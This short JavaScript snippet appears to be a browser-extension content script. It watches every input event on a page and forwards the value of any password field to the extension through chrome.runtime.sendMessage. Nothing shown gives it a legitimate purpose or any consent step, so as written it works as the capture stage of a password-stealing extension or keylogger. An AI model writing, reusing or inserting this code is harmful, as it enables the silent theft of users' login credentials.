document.addEventListener('input', function(event) {
  if (event.target.type === 'password') {
    chrome.runtime.sendMessage({ password: event.target.value });
  }
});
